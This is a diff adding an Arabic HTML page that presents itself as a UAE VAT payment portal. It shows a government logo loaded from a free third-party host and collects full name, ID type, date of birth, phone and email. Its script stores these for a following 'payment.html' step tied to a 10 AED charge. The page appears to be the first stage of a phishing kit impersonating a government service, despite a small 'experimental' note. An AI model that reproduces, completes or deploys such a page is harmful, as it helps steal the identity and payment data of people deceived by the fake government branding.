@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة دفع ضريبة القيمة المضافة</title>
+    <style>
+        body{font-family:Arial,Helvetica,sans-serif;background:#f3f6f9;margin:0;padding:20px;box-sizing:border-box}
+        .container{max-width:420px;margin:30px auto}
+        .card{padding:20px;border-radius:12px;background:#fff;box-shadow:0 4px 10px rgba(0,0,0,0.08)}
+        .logo{max-width:220px;display:block;margin:0 auto 12px}
+        h1{text-align:center;margin:6px 0 12px}
+        input,select{width:100%;padding:12px;border-radius:8px;border:1px solid #e6e9ee;margin-bottom:12px;box-sizing:border-box}
+        .dob{display:flex;gap:8px}
+        .dob input{flex:1}
+        button{width:100%;padding:12px;background:#0b61c2;color:#fff;border:0;border-radius:8px;font-weight:700;cursor:pointer}
+        .note{font-size:13px;color:#666;text-align:center;margin-top:10px}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <img src="https://tonfree.serv00.net/sadUae/index-files/government-ae-logo-arabic.png" alt="شعار" class="logo">
+            <h1>بوابة دفع ضريبة القيمة المضافة</h1>
+
+            <form id="personalForm" autocomplete="off">
+                <input id="fullName" type="text" placeholder="الاسم الكامل" required>
+                <select id="idType" required>
+                    <option value="">اختر نوع الهوية</option>
+                    <option value="هوية اماراتية">الهوية الإماراتية</option>
+                    <option value="جواز سفر">جواز السفر</option>
+                </select>
+
+                <label style="display:block;margin-bottom:6px;font-weight:600">تاريخ الميلاد (ميلادي)</label>
+                <div class="dob">
+                    <input id="day" type="number" placeholder="يوم" min="1" max="31" required>
+                    <input id="month" type="number" placeholder="شهر" min="1" max="12" required>
+                    <input id="year" type="number" placeholder="سنة" min="1900" max="2100" required>
+                </div>
+
+                <input id="phone" type="tel" placeholder="رقم الجوال" required>
+                <input id="email" type="email" placeholder="البريد الإلكتروني" required>
+
+                <button type="submit">التالي</button>
+            </form>
+
+            <p class="note">سيتم نقل بياناتك إلى صفحة الدفع التالية لأكمال العملية (تجريبي).</p>
+        </div>
+    </div>
+
+<script>
+document.getElementById('personalForm').addEventListener('submit', function(e){
+    e.preventDefault();
+
+    const fullName = document.getElementById('fullName').value.trim();
+    const idType = document.getElementById('idType').value;
+    const day = document.getElementById('day').value;
+    const month = document.getElementById('month').value;
+    const year = document.getElementById('year').value;
+    const phone = document.getElementById('phone').value.trim();
+    const email = document.getElementById('email').value.trim();
+
+    if(!fullName || !idType || !day || !month || !year || !phone || !email){
+        alert('الرجاء ملء كافة الحقول المطلوبة.');
+        return;
+    }
+
+    // خزن البيانات مؤقتًا في sessionStorage لصفحة الدفع التالية
+    const data = {
+        fullName, idType,
+        birth: `${day}/${month}/${year}`,
+        phone, email,
+        amount: "10 AED"
+    };
+    sessionStorage.setItem('taxPaymentData', JSON.stringify(data));
+
+    // انتقل إلى صفحة الدفع
+    window.location.href = 'payment.html';
+});
+</script>
+</body>
+</html>
